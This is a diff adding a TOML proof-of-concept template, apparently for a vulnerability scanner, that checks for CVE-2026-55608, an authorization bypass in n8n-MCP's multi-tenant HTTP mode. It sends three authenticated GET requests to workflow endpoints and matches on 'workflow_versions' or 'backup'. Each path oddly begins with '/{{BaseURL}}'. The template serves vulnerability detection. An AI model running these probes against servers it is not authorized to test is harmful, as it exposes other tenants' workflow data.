@@ -1,0 +1,73 @@
+[info]
+author = "ave"
+description = "检测 n8n-MCP 多租户 HTTP 模式下是否存在授权绕过漏洞，已认证租户可访问默认作用域的工作流版本备份"
+id = "POC-AVE-2026-0627"
+name = "n8n-MCP 多租户HTTP模式授权不当信息泄露 PoC"
+severity = "medium"
+tags = [
+    "cve-2026-55608",
+    "n8n-mcp",
+    "authorization-bypass",
+]
+vuln_id = [
+    "CVE-2026-55608",
+    "GHSA-2cf7-hpwf-47h9",
+    "AVE-2026-0627",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/rest/workflows"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "Bearer {{token}}"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "workflow_versions",
+    "backup",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/rest/workflow-versions"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "Bearer {{token}}"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "workflow_versions",
+    "backup",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/rest/workflows?scope=default"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "Bearer {{token}}"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "workflow_versions",
+    "backup",
+]
